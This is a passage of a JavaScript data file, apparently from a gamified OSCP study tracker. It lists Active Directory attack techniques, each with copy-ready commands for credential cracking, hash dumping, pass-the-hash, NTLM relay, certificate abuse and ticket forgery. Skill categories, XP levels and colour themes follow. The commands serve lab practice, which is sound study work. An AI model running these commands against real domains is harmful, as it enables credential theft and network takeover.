    cmd:`impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC-IP> -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force`,
  },
  {
    id:"asrep", name:"3. AS-REP Roasting",
    desc:"Attack accounts with no Kerberos pre-auth required. No creds needed if you have usernames.",
    cmd:`impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile asrep.txt
# With creds:
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <DC-IP> -request
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force`,
  },
  {
    id:"pth", name:"4. Pass the Hash (PtH)",
    desc:"Authenticate with NTLM hash directly — no cracking needed.",
    cmd:`netexec smb <IP>   -u <user> -H <NTLM-hash>
netexec winrm <IP> -u <user> -H <NTLM-hash>
impacket-psexec  <domain>/<user>@<IP> -hashes :<NTLM-hash>
impacket-wmiexec <domain>/<user>@<IP> -hashes :<NTLM-hash>
evil-winrm -i <IP> -u <user> -H <NTLM-hash>`,
  },
  {
    id:"ptt", name:"5. Pass the Ticket (PtT)",
    desc:"Import a Kerberos TGT/TGS for lateral movement without the password.",
    cmd:`impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC-IP>
export KRB5CCNAME=<user>.ccache
impacket-psexec <domain>/<user>@<DC-hostname> -k -no-pass

# Windows (Rubeus):
Rubeus.exe asktgt /user:<user> /password:<pass> /ptt`,
  },
  {
    id:"dcsync", name:"6. DCSync",
    desc:"Simulate DC replication to dump all hashes. Needs GetChangesAll + GetChanges rights.",
    cmd:`impacket-secretsdump <domain>/<user>:<pass>@<DC-IP>
impacket-secretsdump -just-dc-ntlm <domain>/<user>@<DC-IP>

# After dump → PTH with Administrator hash
netexec smb <DC-IP> -u Administrator -H <hash> --local-auth`,
  },
  {
    id:"acl-abuse", name:"7. ACL / ACE Abuse",
    desc:"Exploit GenericAll, WriteDACL, GenericWrite, ForceChangePassword. BloodHound finds these.",
    cmd:`# GenericAll / GenericWrite on user → change password:
impacket-changepasswd <domain>/<target>@<DC-IP> -newpasswd 'Pwned1234!'
net rpc password <target> 'Pwned1234!' -U '<domain>/<user>%<pass>' -S <DC>

# WriteDACL on domain → grant yourself DCSync:
dacledit.py -action write -rights DCSync -principal <youruser> \\
  -target-dn 'DC=<domain>,DC=<tld>' '<domain>/<user>:<pass>'`,
  },
  {
    id:"adcs", name:"8. ADCS / Certificate Abuse",
    desc:"Misconfigured certificate templates (ESC1-ESC8). certipy is the go-to tool.",
    cmd:`# Find vulnerable templates:
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -vulnerable -stdout

# ESC1 — enrollee supplies SAN + Client Auth:
certipy req -u <user>@<domain> -p <pass> -ca <CA-name> \\
  -template <VulnTemplate> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
# → gives Administrator NTLM hash`,
  },
  {
    id:"laps", name:"9. LAPS",
    desc:"Read per-machine local admin passwords from ms-Mcs-AdmPwd in AD.",
    cmd:`netexec ldap <DC-IP> -u <user> -p <pass> -M laps
netexec ldap <DC-IP> -u <user> -p <pass> --attr ms-Mcs-AdmPwd
impacket-ldapdomaindump <DC-IP> -u '<domain>\\<user>' -p '<pass>'
# Look for ms-Mcs-AdmPwd in domain_computers.json`,
  },
  {
    id:"ntlm-relay", name:"10. NTLM Relay",
    desc:"Capture and relay NTLM auth without cracking. SMB signing must be off on target.",
    cmd:`# Check for signing-disabled hosts:
netexec smb <subnet>/24 --gen-relay-list targets.txt

# Responder with SMB+HTTP off:
responder -I tun0 -dwv --no-smb --no-http

# Relay:
impacket-ntlmrelayx -tf targets.txt -smb2support
# Interactive shell:
impacket-ntlmrelayx -tf targets.txt -smb2support -i`,
  },
  {
    id:"gpp", name:"11. GPP Password (MS14-025)",
    desc:"Credentials stored in SYSVOL Group Policy XML files. Encrypted with a public AES key.",
    cmd:`netexec smb <DC-IP> -u <user> -p <pass> -M gpp_password
netexec smb <DC-IP> -u <user> -p <pass> -M gpp_autologin

# Manual SYSVOL search:
smbclient //<DC-IP>/SYSVOL -U '<domain>\\<user>'
# Find: Groups.xml, Drives.xml, ScheduledTasks.xml
gpp-decrypt <cpassword_value>`,
  },
  {
    id:"silver-ticket", name:"12. Silver Ticket",
    desc:"Forge a TGS for a specific service using the service account NTLM hash. No DC contact.",
    cmd:`impacket-lookupsid <domain>/<user>:<pass>@<DC-IP>  # get domain SID

impacket-ticketer -nthash <service-NTLM> -domain-sid <SID> \\
  -domain <domain> -spn <SPN/hostname> <username>

export KRB5CCNAME=<username>.ccache
impacket-psexec <domain>/<username>@<hostname> -k -no-pass`,
  },
];

// Hierarchical skill map — drives the skills tab
const SKILL_CATEGORIES = [
  {
    name:   'Enumeration',
    accent: 'var(--px-blue)',
    skills: ['smb', 'dns', 'snmp', 'enumeration'],
  },
  {
    name:   'Web & Initial Access',
    accent: 'var(--px-yellow)',
    skills: ['sqli', 'lfi', 'rfi', 'upload', 'cms', 'rce'],
  },
  {
    name:   'Linux PrivEsc',
    accent: 'var(--px-mint)',
    skills: ['privesc', 'suid', 'cron', 'sudo'],
  },
  {
    name:   'Windows PrivEsc',
    accent: 'var(--px-pink)',
    skills: ['token-impersonation', 'buffer-overflow', 'service-exploit', 'registry'],
  },
  {
    name:   'Active Directory',
    accent: 'var(--px-purple)',
    skills: ['kerberoasting', 'as-rep-roasting', 'dcsync', 'adcs', 'laps', 'ntlm-relay', 'acl-abuse', 'silver-ticket', 'dns-admin', 'dpapi'],
  },
];

const XP_TABLE    = { Easy: 100, Medium: 200, Hard: 350 };
const AD_BONUS    = 75;   // extra XP per rooted AD machine
const AD_TECH_XP  = 30;  // XP per checked AD lab technique

const LEVELS = [
  { min:    0, name:"NOOB",          next:  300 },
  { min:  300, name:"SCRIPT KIDDIE", next:  900 },
  { min:  900, name:"HACKER",        next: 2500 },
  { min: 2500, name:"SR. HACKER",    next: 5500 },
  { min: 5500, name:"ELITE",         next: 9000 },
  { min: 9000, name:"OSCP READY",    next: 9000 },
];

const THEMES = {
  pastel: {
    label: "Pastel",
    swatch: "#b388f0",
    vars: {
      "--px-bg":            "#f0e6ff",
      "--px-bg2":           "#e8d5ff",
      "--px-surface":       "#fdf6ff",
      "--px-border":        "#c9a8f0",
      "--px-purple":        "#b388f0",   // header
      "--px-pink":          "#f0a8d0",   // tags
      "--px-mint":          "#a8f0d8",   // success / bar fill
      "--px-yellow":        "#f0e8a8",   // buttons
      "--px-blue":          "#a8d0f0",   // links / info
      "--px-red":           "#f0a8a8",   // danger
      "--px-text":          "#3d2060",   // main text + borders + shadows
      "--px-text2":         "#7a5599",   // secondary text
      "--px-rooted-bg":     "#edfff5",   // rooted row bg
      "--px-rooted-border": "#6bc87a",   // rooted row border
      "--px-prog-bg":       "#fffbe8",   // in-progress row bg
      "--px-prog-border":   "#d4b84a",   // in-progress row border
    },
  },

  dark: {
    label: "Dark",
    swatch: "#7c3aed",                   // vivid purple — distinct from hacker
    vars: {
      "--px-bg":            "#09090f",
      "--px-bg2":           "#13111f",
      "--px-surface":       "#1e1b2e",
      "--px-border":        "#5b21b6",
      "--px-purple":        "#7c3aed",   // header — vivid purple
      "--px-pink":          "#ec4899",   // tags — hot pink
      "--px-mint":          "#34d399",   // success — emerald
      "--px-yellow":        "#fbbf24",   // buttons — amber, great on dark
      "--px-blue":          "#60a5fa",   // links — sky blue
      "--px-red":           "#f87171",   // danger — soft red
      "--px-text":          "#f1efff",   // light text → also used for neon-white borders
      "--px-text2":         "#a89dc0",   // muted purple-gray
      "--px-rooted-bg":     "#0a1f12",   // dark green tint
      "--px-rooted-border": "#34d399",
      "--px-prog-bg":       "#1c1608",   // dark amber tint
      "--px-prog-border":   "#fbbf24",
    },
  },

  hacker: {
    label: "Hacker",
    swatch: "#22c55e",                   // terminal green — clearly distinct
    vars: {
      "--px-bg":            "#0d1117",
      "--px-bg2":           "#161b22",
      "--px-surface":       "#21262d",
      "--px-border":        "#238636",   // GitHub green border
      "--px-purple":        "#1a7f37",   // header — deep forest green (readable, not neon)
      "--px-pink":          "#58a6ff",   // tags — GitHub blue (contrast against all the green)
      "--px-mint":          "#22c55e",   // success — bright terminal green
      "--px-yellow":        "#d29922",   // buttons — golden amber (stands out on dark!)
      "--px-blue":          "#79c0ff",   // links — lighter GitHub blue
      "--px-red":           "#f85149",   // danger — GitHub red
      "--px-text":          "#e6edf3",   // GitHub dark main text
      "--px-text2":         "#7d8590",   // GitHub muted text
      "--px-rooted-bg":     "#071e0c",   // very dark green
      "--px-rooted-border": "#22c55e",
      "--px-prog-bg":       "#1a1200",   // very dark amber
      "--px-prog-border":   "#d29922",
    },
  },

  sunset: {
    label: "Sunset",
    swatch: "#f97316",
    vars: {
      "--px-bg":            "#fef3ee",
      "--px-bg2":           "#fde8d8",
      "--px-surface":       "#fff8f5",
      "--px-border":        "#fb923c",
      "--px-purple":        "#c2410c",
      "--px-pink":          "#f43f5e",
      "--px-mint":          "#0d9488",
      "--px-yellow":        "#fcd34d",
      "--px-blue":          "#0284c7",
      "--px-red":           "#dc2626",
      "--px-text":          "#431407",
      "--px-text2":         "#9a3412",
      "--px-rooted-bg":     "#f0fdf4",
      "--px-rooted-border": "#10b981",
      "--px-prog-bg":       "#fffbeb",
      "--px-prog-border":   "#d97706",
    },
  },

  dracula: {
    label: "Dracula",
    swatch: "#bd93f9",
    vars: {
      "--px-bg":            "#282a36",
      "--px-bg2":           "#1e2029",
      "--px-surface":       "#343746",
      "--px-border":        "#6272a4",
      "--px-purple":        "#bd93f9",
      "--px-pink":          "#ff79c6",
      "--px-mint":          "#50fa7b",
      "--px-yellow":        "#f1fa8c",
      "--px-blue":          "#8be9fd",
      "--px-red":           "#ff5555",
      "--px-text":          "#f8f8f2",
      "--px-text2":         "#6272a4",
      "--px-rooted-bg":     "#1a3325",
      "--px-rooted-border": "#50fa7b",
      "--px-prog-bg":       "#2d2010",
      "--px-prog-border":   "#f1fa8c",
    },
  },

  cyberpunk: {
    label: "Cyberpunk",
    swatch: "#ff00cc",
    vars: {
      "--px-bg":            "#0d0221",
      "--px-bg2":           "#160a2c",
      "--px-surface":       "#1e1040",
      "--px-border":        "#cc00ff",
      "--px-purple":        "#cc00ff",
      "--px-pink":          "#00d4ff",
      "--px-mint":          "#39ff14",
      "--px-yellow":        "#ffe600",
      "--px-blue":          "#00d4ff",
      "--px-red":           "#ff0066",
      "--px-text":          "#f0e0ff",
      "--px-text2":         "#aa77dd",
      "--px-rooted-bg":     "#0a1a04",
      "--px-rooted-border": "#39ff14",
      "--px-prog-bg":       "#1a1400",
      "--px-prog-border":   "#ffe600",
    },
  },

  ocean: {
    label: "Ocean",
    swatch: "#1a6b9a",
    vars: {
      "--px-bg":            "#e8f4f8",
      "--px-bg2":           "#d0eaf5",
      "--px-surface":       "#f0f9ff",
      "--px-border":        "#5ba4cf",
      "--px-purple":        "#1a6b9a",
      "--px-pink":          "#e94560",
      "--px-mint":          "#2ab7a9",
      "--px-yellow":        "#f5c842",
      "--px-blue":          "#1a6b9a",
      "--px-red":           "#e94560",
      "--px-text":          "#0d2d45",
      "--px-text2":         "#3a6d8c",
      "--px-rooted-bg":     "#e8fff5",
      "--px-rooted-border": "#2ab7a9",
      "--px-prog-bg":       "#fffbec",
      "--px-prog-border":   "#f5c842",
    },
  },
};
